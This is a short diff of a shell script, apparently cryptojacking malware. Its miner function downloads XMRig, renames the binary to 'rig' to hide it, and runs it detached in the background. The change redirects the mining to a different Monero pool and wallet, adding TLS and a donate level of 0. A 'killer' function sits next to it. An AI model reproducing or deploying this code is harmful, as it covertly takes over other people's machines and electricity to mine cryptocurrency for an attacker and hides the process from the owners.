@@ -12,7 +12,7 @@ function miner() {
     wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz ;
     tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz ;
     mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig ;
-    nohup xmrig-6.20.0/rig -a rx -o gulf.moneroocean.stream:10128 -u 41qn42wuAxjDb5Euccqitk7z7kWJ1ZSyCWkArNPexdyG4cC8wP3FRHGGgBxoFqYWktMvySUWLWg7ghzccooPKWgWQ3bt6Kr -p x &>/dev/null & disown -h %1
+    nohup /xmrig-6.20.0/rig --url pool.hashvault.pro:80 --user 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 & disown -h %1
 }
 
 function killer() {
